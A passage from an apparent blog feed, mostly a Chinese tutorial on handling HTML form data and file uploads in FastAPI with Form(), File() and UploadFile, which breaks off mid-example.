python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> contextlib<br><br><br><span class="hljs-meta">@contextlib.contextmanager</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">filename: <span class="hljs-built_in">str</span></span>):<br>    file = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">yield</span> file<br>    file.close()<br><br><br><span class="hljs-keyword">with</span> get_file(<span class="hljs-string">&#x27;test.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read()) <span class="hljs-comment"># 打印文件内的内容</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>编程，web开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】FastAPI表单和文件上传（三）</title>
    <link href="/2024/01/18/683FastAPI3%E8%A1%A8%E5%8D%95%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2024/01/18/683FastAPI3%E8%A1%A8%E5%8D%95%E5%92%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="6-1-什么是Form-表单"><a href="#6-1-什么是Form-表单" class="headerlink" title="6-1  什么是Form 表单"></a>6-1  什么是Form 表单</h1><p>很多网站都支持上传文件，比如说：注册时上传头像；填写问卷时上传附件等等。</p><p>Form表单其实是前端HTML语言中的一个标签语言，用来向服务端上传普通数据和文件。</p><p>示例1：Form表单的基本使用（浏览器直接打开该文件即可渲染出form表单页面）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>用户登录<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>姓名： <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>action=&quot;/login&quot;</code>，action用来设置服务端的接口，不设置表示朝当前页面所在URL发请求</li><li><code>method=&quot;post&quot;</code>，methos用来设置发请求的方式，一共有两种：post和get，不设置默认是get请求</li><li><input type="text" name="username">，name用来设置该字段的字段名</li><li><input type="password" name="password">， type用来设置该字段的类型，或者说input标签的类型</li></ul><p>补充：常见的input标签类型</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--普通文本--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--密码文本，密码密文现实--&gt;</span>  <span class="hljs-comment">&lt;!-- --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--日期，固定日期提交格式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--提交，用来触发form表单提交数据的动作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--按钮，普通按钮，本身没有功能，但是结合js可以绑定事件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--重置 --&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--单选， --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--多选 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--文件，上传文件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--隐藏，隐藏当前输入框 --&gt;</span><br></code></pre></td></tr></table></figure><p>示例2：Form表单用来上传文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>上传头像<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>上传头像<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>姓名： <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>头像：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>enctype&#x3D;”multipart&#x2F;form-data”，上传文件比较特殊，需要使用enctype指定编码</li><li><input type="file" name="avatar"></p>，上传文件的字段需要使用类型为file的input标签</li></ul><h1 id="6-2-Form表单两种编码方式"><a href="#6-2-Form表单两种编码方式" class="headerlink" title="6-2 Form表单两种编码方式"></a>6-2 Form表单两种编码方式</h1><p>Form表单提交数据有两种请求方式，GET和POST。</p><p>当使用POST请求时，请求体数据有两种常用的编码方式，非常重要。</p><ul><li><pre><code class="html">&lt;form action=&quot;/login&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;&lt;/form&gt;<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>- ~~~html<br>  &lt;form <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;/login&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attribute">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure></code></pre></li></ul><p>当请求体编码是application&#x2F;x-www-form-urlencoded，此时编码方式和url中的查询参数编码格式一致，不能用来上传文件</p><p>当请求体编码是multipart&#x2F;form-data时，既可以上传文件，也可以用来发送普通数据。</p><h1 id="6-3-使用Form接收表单数据"><a href="#6-3-使用Form接收表单数据" class="headerlink" title="6-3 使用Form接收表单数据"></a>6-3 使用Form接收表单数据</h1><p>请求体数据的编码格式除了可以JOSN，还可以是使用form表单的application&#x2F;x-www-form-urlencoded和multipart&#x2F;form-data</p><p>当前端使用form表单提交数据，enctype指定application&#x2F;x-www-form-urlencoded，此时FastAPI该怎么解析数据呢？</p><p>示例1：使用 <code>Form()</code> 函数来接收urlencoded编码格式的表单数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, Form<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/login/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;password&quot;</span>: password<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li><p>路径函数中的参数如果希望是表单字段，必须使用 <code>Form()</code>，否则会被当做查询参数和请求体参数。</p></li><li><p><code>Form()</code>和前面介绍的 <code>Path()</code>、<code>Query()</code>、<code>Body()</code>、<code>Header()</code>的用法基本一致，支持类型校核和转换。</p></li><li><p>想要使用 <code>Form</code>接收表单数据，需要安装python扩展包：<code>pip3 install python-multipart</code></p></li></ul><p>除了使用postman也可以使用FastAPI自带的api文档请求接口</p><h1 id="6-4-使用File上传文件"><a href="#6-4-使用File上传文件" class="headerlink" title="6-4 使用File上传文件"></a>6-4 使用File上传文件</h1><p>【前提】：需要提前下载第三方包：<code>pip3 install python-multipart</code></p><p>示例1：使用 <code>File()</code>用来接收表单发送过来的文件</p><ul><li>路径函数中形参<code>file</code>要和表单中文件字段保持一致，且形参的类型为 <code>bytes</code>，值为<code>File()</code>，这样就可以直接将文件中二进制数据保存到形参<code>file</code>中，也就是直接将文件内容读取到内存中，适合小文件上传。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File<br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file: <span class="hljs-built_in">bytes</span> = File(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-built_in">print</span>(file)<span class="hljs-comment"># file中保存的就是文件的二进制数据</span><br>    <span class="hljs-comment"># 文件内容保存在硬盘</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(file)<br>    <span class="hljs-keyword">return</span> file<br></code></pre></td></tr></table></figure><blockquote><p>使用api文档发送请求，也可以使用postman发送表单请求</p></blockquote><p>示例2：形参<code>file</code>的类型不能是<code>str</code>，但如果没有类型，直接使用 <code>file=File()</code>也可以，只不过这样需要特殊处理才能获取文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File<br><br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file=File(<span class="hljs-params"></span>)</span>):<br>    content = <span class="hljs-keyword">await</span> file.read()<span class="hljs-comment"># 需要特殊处理才能过去文件的二进制数据</span><br>    <span class="hljs-built_in">print</span>(content)<br>    <span class="hljs-keyword">return</span> content<br></code></pre></td></tr></table></figure><p>【重要】 对于上文件的上传需求，推荐使用示例1的方式。</p><p>【总结】只要在路径操作函数中声明了变量的类型是<code>bytes</code>且使用了<code>File,</code>则fastapi会将上传文件的内容全部去读到参数中。</p><h1 id="6-5-使用UploadFile上传文件"><a href="#6-5-使用UploadFile上传文件" class="headerlink" title="6-5 使用UploadFile上传文件"></a>6-5 使用UploadFile上传文件</h1><p>前提】：需要提前下载第三方包：<code>pip3 install python-multipart</code></p><p>【需求】：对于大文件，不适合直接把文件内容一次性读取到内存中，此时推荐使用 <code>UploadFile</code></p><p>示例1：使用UploadFile类型的三个属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, UploadFile<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file: UploadFile</span>):<span class="hljs-comment"># UploadFile是类型，不用加括号哦</span><br>    <br>    content = file.file.read()<span class="hljs-comment"># 可以直接使用文件的操作方法</span><br>    file.file.close()<br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;filename&quot;</span>: file.filename,<span class="hljs-comment"># filename 是文件名 如：a.txt</span><br>        <span class="hljs-string">&quot;type&quot;</span>: file.content_type,<span class="hljs-comment"># content_type 是文件类型 如：text/plain</span><br>        <span class="hljs-string">&quot;content&quot;</span>: content      <span class="hljs-comment"># file是标准的Python文件对象，可以直接使用文件的操作</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>示例2：使用UploadFile类型的四个方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, UploadFile<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file: UploadFile</span>):<br>    <br>    content = <span class="hljs-keyword">await</span> file.read()<span class="hljs-comment"># 异步读文件</span><br>    <span class="hljs-keyword">await</span> file.close()    <span class="hljs-comment"># 异步关闭文件</span><br>    <br>    <span class="hljs-comment"># await file.write()      # 异步写文件</span><br>    <span class="hljs-comment"># await fiel.seek(1)    # 异步移动光标</span><br>        <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;filename&quot;</span>: file.filename,<br>        <span class="hljs-string">&quot;type&quot;</span>: file.content_type,<br>        <span class="hljs-string">&quot;content&quot;</span>: content<br>    &#125;<br></code></pre></td></tr></table></figure><p>示例3：使用UploadFile的同时也可以是使用File</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, UploadFile, File<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>(<span class="hljs-params">file: UploadFile = File(<span class="hljs-params"></span>)</span>):<br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;filename&quot;</span>: file.filename,<br>        <span class="hljs-string">&quot;type&quot;</span>: file.content_type,<br>    &#125;<br></code></pre></td></tr></table></figure><p>【总结】</p><ul><li>UploadFile不会把文件内容全部加载到内存中，而是批量读取一定量的数据，边读边存硬盘，适合大文件。</li><li>UploadFile类型问变量有3个属性（filename、content_type、file），4个异步方法（read\write\seek\close）。</li></ul><h1 id="6-6-设置上传文件是可选的"><a href="#6-6-设置上传文件是可选的" class="headerlink" title="6-6 设置上传文件是可选的"></a>6-6 设置上传文件是可选的</h1><p>示例：设置默认值是None就表示上传文件是可选的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File, UploadFile<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/file&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_file</span>(<span class="hljs-params">file: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">bytes</span>] = File(<span class="hljs-params">default=<span class="hljs-literal">None</span></span>)</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No file sent&quot;</span>&#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;file_size&quot;</span>: <span class="hljs-built_in">len</span>(file)&#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/uploadfile&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_upload_file</span>(<span class="hljs-params">file: <span class="hljs-type">Optional</span>[UploadFile] = <span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No upload file sent&quot;</span>&#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;filename&quot;</span>: file.filename&#125;<br></code></pre></td></tr></table></figure><h1 id="6-7-上传多个文件"><a href="#6-7-上传多个文件" class="headerlink" title="6-7 上传多个文件"></a>6-7 上传多个文件</h1><p>示例：上传多个文件，文件字段名可以同名也可以不同名</p><ul><li>同名字段时，也可使用 <code>files: List[bytes] = File()</code></li><li>不同名字段，可以直接定义多个形参即可。</li><li>多文件上传，也可以使用UploadFile；也可以同时使用File和UploadFile</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, File, UploadFile<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/files&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_files</span>(<span class="hljs-params">files: <span class="hljs-type">List</span>[<span class="hljs-built_in">bytes</span>] = File(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;file_sizes&quot;</span>: [<span class="hljs-built_in">len</span>(file) <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files]&#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/files2&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_files</span>(<span class="hljs-params">file1: <span class="hljs-built_in">bytes</span> = File(<span class="hljs-params"></span>), file2: <span class="hljs-built_in">bytes</span> = File(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;file1_size&quot;</span>: <span class="hljs-built_in">len</span>(file1),<br>        <span class="hljs-string">&quot;file2_size&quot;</span>: <span class="hljs-built_in">len</span>(file2),<br>    &#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/uploadfiles&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_upload_files</span>(<span class="hljs-params">files: <span class="hljs-type">List</span>[UploadFile]</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;filenames&quot;</span>: [file.filename <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files]&#125;<br><br><br><span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/uploadfile2&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file_and_file</span>(<span class="hljs-params">file1: UploadFile, file2: <span class="hljs-built_in">bytes</span> = File(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;file1_name&quot;</span>: file1.filename,<br>        <span class="hljs-string">&quot;file2_size&quot;</span>: <span class="hljs-built_in">len</span>(file2)<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="6-8-同时接收表单数据和文件"><a href="#6-8-同时接收表单数据和文件" class="headerlink" title="6-8 同时接收表单数据和文件"></a>6-8 同时接收表单数据和文件</h1><ul><li>很多时候我们需要同时接收表单数据和上传的文件数据，此时我们可以同时使用Form和File或UploadFile</li></ul><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 